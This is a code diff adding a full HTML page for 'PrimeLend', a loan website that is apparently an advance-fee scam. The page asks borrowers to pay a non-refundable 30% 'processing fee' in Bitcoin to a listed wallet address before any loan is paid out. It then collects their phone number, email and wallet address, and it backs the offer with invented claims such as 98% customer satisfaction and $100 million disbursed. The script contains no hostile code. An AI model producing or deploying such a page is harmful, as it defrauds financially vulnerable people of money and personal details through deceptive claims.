@@ -1,0 +1,663 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width, initial-scale=1.0">
+    <title>PrimeLend - Trusted Financial Solutions</title>
+    <style>
+        :root {
+            --primary: #2563eb;
+            --primary-dark: #1d4ed8;
+            --secondary: #10b981;
+            --danger: #ef4444;
+            --dark: #1f2937;
+            --light: #f3f4f6;
+            --white: #ffffff;
+            --gray: #9ca3af;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: var(--light);
+            color: var(--dark);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        header {
+            background-color: var(--white);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 0;
+        }
+
+        .logo {
+            font-size: 1.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            text-decoration: none;
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 2rem;
+        }
+
+        .nav-links a {
+            text-decoration: none;
+            color: var(--dark);
+            font-weight: 500;
+            transition: color 0.3s;
+        }
+
+        .nav-links a:hover {
+            color: var(--primary);
+        }
+
+        .btn {
+            background-color: var(--primary);
+            color: var(--white);
+            border: none;
+            padding: 0.75rem 1.5rem;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: background-color 0.3s;
+        }
+
+        .btn:hover {
+            background-color: var(--primary-dark);
+        }
+
+        .hero {
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            color: var(--white);
+            padding: 5rem 0;
+            text-align: center;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+        }
+
+        .hero p {
+            font-size: 1.25rem;
+            margin-bottom: 2rem;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .section {
+            padding: 5rem 0;
+            background-color: var(--white);
+        }
+
+        .loan-container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .amount-slider {
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        .slider-container {
+            position: relative;
+            height: 60px;
+        }
+
+        input[type="range"] {
+            width: 100%;
+            height: 10px;
+            background: #e4e7eb;
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
+            position: absolute;
+            top: 25px;
+        }
+
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 30px;
+            height: 30px;
+            background: var(--primary);
+            border-radius: 50%;
+            cursor: pointer;
+            border: 4px solid var(--white);
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+
+        .amount-display {
+            font-size: 2.5rem;
+            font-weight: bold;
+            color: var(--primary);
+            text-align: center;
+            margin: 1rem 0;
+        }
+
+        .loan-details {
+            background-color: var(--light);
+            padding: 2rem;
+            border-radius: 10px;
+            margin-top: 2rem;
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+            padding-bottom: 1rem;
+            border-bottom: 1px solid #e5e7eb;
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+
+        .detail-label {
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .detail-value {
+            font-weight: bold;
+            color: var(--dark);
+        }
+
+        .processing-fee {
+            color: var(--danger);
+        }
+
+        .crypto-section {
+            background-color: var(--light);
+            padding: 2rem;
+            border-radius: 10px;
+            margin-top: 2rem;
+            display: none;
+        }
+
+        .crypto-section.active {
+            display: block;
+        }
+
+        .crypto-address {
+            background-color: var(--white);
+            padding: 1rem;
+            border-radius: 5px;
+            border: 2px dashed var(--gray);
+            text-align: center;
+            margin: 1rem 0;
+            word-break: break-all;
+            font-family: monospace;
+            font-size: 0.9rem;
+        }
+
+        .warning-box {
+            background-color: #fef3c7;
+            border-left: 4px solid #f59e0b;
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 5px;
+        }
+
+        .warning-box h3 {
+            color: #b45309;
+            margin-bottom: 0.5rem;
+        }
+
+        .warning-box p {
+            color: #b45309;
+            font-size: 0.9rem;
+        }
+
+        .info-section {
+            padding: 5rem 0;
+            background-color: var(--white);
+        }
+
+        .info-container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .info-content {
+            background-color: var(--light);
+            padding: 3rem;
+            border-radius: 10px;
+            margin-bottom: 2rem;
+        }
+
+        .info-content h2 {
+            color: var(--primary);
+            margin-bottom: 1.5rem;
+            font-size: 2rem;
+        }
+
+        .info-content p {
+            margin-bottom: 1rem;
+            line-height: 1.8;
+        }
+
+        .faq-item {
+            background-color: var(--white);
+            padding: 2rem;
+            border-radius: 10px;
+            margin-bottom: 1rem;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .faq-item h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+
+        .contact-info {
+            background-color: var(--primary);
+            color: var(--white);
+            padding: 3rem;
+            border-radius: 10px;
+            text-align: center;
+        }
+
+        .contact-info h2 {
+            margin-bottom: 2rem;
+        }
+
+        .contact-details {
+            font-size: 1.2rem;
+            margin: 2rem 0;
+        }
+
+        .contact-details p {
+            margin: 1rem 0;
+        }
+
+        footer {
+            background-color: var(--dark);
+            color: var(--white);
+            padding: 3rem 0;
+            text-align: center;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 2rem;
+            margin: 2rem 0;
+        }
+
+        .footer-links a {
+            color: var(--gray);
+            text-decoration: none;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: var(--white);
+        }
+
+        .copyright {
+            color: var(--gray);
+            font-size: 0.9rem;
+        }
+
+        .success-message {
+            background-color: #d1fae5;
+            border-left: 4px solid var(--secondary);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 5px;
+            display: none;
+        }
+
+        .success-message.active {
+            display: block;
+        }
+
+        .details-form {
+            background-color: var(--white);
+            padding: 2rem;
+            border-radius: 10px;
+            margin-top: 2rem;
+            border: 2px solid var(--primary);
+        }
+
+        .details-form h3 {
+            color: var(--primary);
+            margin-bottom: 1rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--dark);
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid #d1d5db;
+            border-radius: 5px;
+            font-size: 1rem;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(37, 99, 235, 0.1);
+        }
+
+        .form-notice {
+            background-color: #dbeafe;
+            border-left: 4px solid var(--primary);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 5px;
+        }
+
+        .form-notice h4 {
+            color: var(--primary);
+            margin-bottom: 0.5rem;
+        }
+
+        .form-notice p {
+            color: var(--dark);
+            font-size: 0.9rem;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <nav>
+                <a href="#" class="logo">PrimeLend</a>
+                <div class="nav-links">
+                    <a href="#home">Home</a>
+                    <a href="#about">About Us</a>
+                    <a href="#faq">FAQ</a>
+                    <a href="#contact">Contact</a>
+                </div>
+            </nav>
+        </div>
+    </header>
+
+    <section id="home" class="hero">
+        <div class="container">
+            <h1>Your Trusted Financial Partner</h1>
+            <p>PrimeLend provides secure, transparent, and fast loan solutions to help you achieve your financial goals. Get up to $50,000 with our streamlined process.</p>
+            <button class="btn" onclick="scrollToLoan()">Apply Now</button>
+        </div>
+    </section>
+
+    <section id="loan" class="section">
+        <div class="container">
+            <div class="loan-container">
+                <h2>Choose Your Loan Amount</h2>
+                <p>Select how much you need to borrow. We offer loans from $10,000 to $50,000 with transparent terms and full disbursement.</p>
+                
+                <div class="amount-slider">
+                    <div class="slider-container">
+                        <input type="range" min="10000" max="50000" step="1000" value="10000" id="loanAmount">
+                    </div>
+                    <div class="amount-display">$<span id="displayAmount">10,000</span></div>
+                </div>
+
+                <div class="loan-details">
+                    <div class="detail-row">
+                        <span class="detail-label">Loan Amount:</span>
+                        <span class="detail-value">$<span id="loanAmountDisplay">10,000</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">Processing Fee (30%):</span>
+                        <span class="detail-value processing-fee">$<span id="processingFee">3,000</span></span>
+                    </div>
+                    <div class="detail-row">
+                        <span class="detail-label">You Receive:</span>
+                        <span class="detail-value" style="color: var(--secondary);">$<span id="receiveAmount">10,000</span></span>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h3>Important Notice</h3>
+                    <p>Before your loan is processed, you will be required to pay a 30% processing fee in cryptocurrency. This fee is non-refundable. Once verified, you will receive the full loan amount.</p>
+                </div>
+
+                <button class="btn" onclick="showCryptoSection()">Proceed to Payment</button>
+
+                <div class="crypto-section" id="cryptoSection">
+                    <h3>Pay Processing Fee in Bitcoin (BTC)</h3>
+                    <p>To proceed with your loan application, please send the processing fee in Bitcoin (BTC) to the following address:</p>
+                    
+                    <div class="crypto-address">
+                        bc1qd473pfd57skywzxxleaz3rp37lc5dz4a0ajxnf
+                    </div>
+                    
+                    <p style="margin-top: 1rem; font-weight: bold; color: var(--danger);">IMPORTANT: Send ONLY Bitcoin (BTC) to this address. The equivalent amount in USD ($<span id="cryptoAmount">3,000</span>) must be sent in BTC.</p>
+                    
+                    <div class="details-form" id="detailsForm">
+                        <h3>After Payment: Provide Your Details</h3>
+                        <p style="margin-bottom: 1rem; color: var(--dark);">Once you have made the Bitcoin payment, please provide your details below so we can process your full loan amount.</p>
+                        
+                        <div class="form-notice">
+                            <h4>Important: Repayment Plan Agreement</h4>
+                            <p>After submitting your details, our team will call you to discuss and agree on a repayment plan that works for your financial situation. We believe in flexible, fair terms that ensure your success.</p>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="phoneNumber">Phone Number</label>
+                            <input type="tel" id="phoneNumber" placeholder="+1 (XXX) XXX-XXXX" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="email">Email Address</label>
+                            <input type="email" id="email" placeholder="your.email@example.com" required>
+                        </div>
+
+                        <div class="form-group">
+                            <label for="cryptoAddress">Your BTC, ETH, or USDT Wallet Address (to receive funds)</label>
+                            <input type="text" id="cryptoAddress" placeholder="Enter your cryptocurrency wallet address" required>
+                        </div>
+
+                        <button class="btn" onclick="submitDetails()">Submit Details</button>
+
+                        <div class="warning-box" style="margin-top: 1rem;">
+                            <p>Ensure all information is accurate. Our team will contact you at the provided phone number to finalize your loan agreement and repayment schedule.</p>
+                        </div>
+                    </div>
+
+                    <div class="success-message" id="successMessage">
+                        <h3>Payment Verification</h3>
+                        <p>Our team will verify your payment and process your full loan amount. You will receive the complete loan sum as requested.</p>
+                    </div>
+
+                    <div class="warning-box">
+                        <h3>Security Notice</h3>
+                        <p>Always verify the cryptocurrency address before sending funds. PrimeLend will never ask you to send funds to any other address. Contact us if you have any concerns.</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="about" class="info-section">
+        <div class="container">
+            <div class="info-container">
+                <div class="info-content">
+                    <h2>About PrimeLend</h2>
+                    <p>PrimeLend is a leading financial services provider dedicated to empowering individuals and businesses with accessible, transparent, and secure loan solutions. Founded on the principles of trust, integrity, and innovation, we have helped thousands of clients achieve their financial goals.</p>
+                    
+                    <p>Our mission is to revolutionize the lending industry by providing fast, reliable, and ethical financial services. We believe that everyone deserves access to capital when they need it most, without the bureaucratic hurdles and hidden fees that plague traditional banking institutions.</p>
+                    
+                    <p>At PrimeLend, we leverage cutting-edge technology and blockchain solutions to streamline our processes, ensuring that your transactions are secure, transparent, and efficient. Our team of financial experts is committed to providing personalized service and support throughout your journey with us.</p>
+                    
+                    <p>We are proud to maintain a 98% customer satisfaction rate and have successfully disbursed over $100 million in loans to satisfied clients worldwide. Your financial success is our success, and we are here to help you every step of the way.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="faq" class="info-section" style="background-color: var(--light);">
+        <div class="container">
+            <div class="info-container">
+                <h2 style="text-align: center; color: var(--primary); margin-bottom: 3rem;">Frequently Asked Questions</h2>
+                
+                <div class="faq-item">
+                    <h3>What is the minimum and maximum loan amount?</h3>
+                    <p>PrimeLend offers loans ranging from $10,000 to $50,000. The exact amount you qualify for depends on various factors, including your ability to repay and compliance with our terms.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>Why is there a processing fee?</h3>
+                    <p>The 30% processing fee covers administrative costs, verification processes, and blockchain transaction fees. This fee ensures that we can provide fast, secure, and reliable service to all our clients.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>How long does it take to receive my loan?</h3>
+                    <p>Once the processing fee is confirmed on the blockchain, your full loan amount will be processed and disbursed within 24 hours. In most cases, clients receive their funds much sooner.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>Is my information secure?</h3>
+                    <p>Absolutely. PrimeLend uses state-of-the-art encryption and security protocols to protect your personal and financial information. Your privacy and security are our top priorities.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>What cryptocurrencies do you accept for the processing fee?</h3>
+                    <p>We currently accept Bitcoin (BTC), Ethereum (ETH), and other major cryptocurrencies. Please contact our support team for specific wallet addresses and instructions.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>What happens if I can't pay the processing fee?</h3>
+                    <p>The processing fee is required to initiate the loan process. If you're unable to pay the fee, we recommend contacting our support team to discuss your options.</p>
+                </div>
+
+                <div class="faq-item">
+                    <h3>Can I repay my loan early?</h3>
+                    <p>Yes, PrimeLend encourages early repayment. There are no penalties for paying off your loan ahead of schedule. We believe in flexibility and supporting our clients' financial well-being.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact" class="info-section">
+        <div class="container">
+            <div class="contact-info">
+                <h2>Contact Us</h2>
+                <p style="font-size: 1.2rem; margin-bottom: 2rem;">Our dedicated support team is available 24/7 to assist you with any questions or concerns.</p>
+                
+                <div class="contact-details">
+                    <p><strong>Email Support:</strong></p>
+                    <p style="font-size: 1.5rem; font-weight: bold;">primelendsqp@gmail.com</p>
+                    
+                    <p style="margin-top: 3rem;"><strong>Response Time:</strong></p>
+                    <p>We typically respond to all inquiries within 1-2 hours during business hours. For urgent matters, please mark your email as urgent.</p>
+                    
+                    <p style="margin-top: 2rem;"><strong>Security Reminder:</strong></p>
+                    <p>PrimeLend will never ask for your private keys, password, or sensitive personal information via email. Always verify the sender's address before responding.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Privacy Policy</a>
+                <a href="#">Terms of Service</a>
+                <a href="#">Security</a>
+                <a href="#contact">Contact Us</a>
+            </div>
+            <p class="copyright">© 2024 PrimeLend. All rights reserved. | Financial services provided by PrimeLend LLC.</p>
+        </div>
+    </footer>
+
+    <script>
+        const loanAmountSlider = document.getElementById('loanAmount');
+        const displayAmount = document.getElementById('displayAmount');
+        const loanAmountDisplay = document.getElementById('loanAmountDisplay');
+        const processingFee = document.getElementById('processingFee');
+        const receiveAmount = document.getElementById('receiveAmount');
+        const cryptoAmount = document.getElementById('cryptoAmount');
+        const cryptoSection = document.getElementById('cryptoSection');
+        const successMessage = document.getElementById('successMessage');
+
+        function updateLoanCalculations() {
+            const amount = parseInt(loanAmountSlider.value);
+            const fee = amount * 0.3;
+
+            displayAmount.textContent = amount.toLocaleString();
+            loanAmountDisplay.textContent = amount.toLocaleString();
+            processingFee.textContent = fee.toLocaleString();
+            receiveAmount.textContent = amount.toLocaleString();
+            cryptoAmount.textContent = fee.toLocaleString();
+        }
+
+        function showCryptoSection() {
+            cryptoSection.classList.add('active');
+            successMessage.classList.add('active');
+            window.scrollTo({
+                top: cryptoSection.offsetTop - 100,
+                behavior: 'smooth'
+            });
+        }
+
+        function scrollToLoan() {
+            document.getElementById('loan').scrollIntoView({
+                behavior: 'smooth'
+            });
+        }
+
+        function submitDetails() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const email = document.getElementById('email').value;
+            const cryptoAddress = document.getElementById('cryptoAddress').value;
+
+            if (!phoneNumber || !email || !cryptoAddress) {
+                alert('Please fill in all required fields.');
+                return;
+            }
+
+            alert('Thank you! Your details have been submitted. Our team will contact you at the provided phone number to discuss your repayment plan and finalize your loan agreement.');
+        }
+
+        loanAmountSlider.addEventListener('input', updateLoanCalculations);
+
+        updateLoanCalculations();
+    </script>
+</body>
+</html>
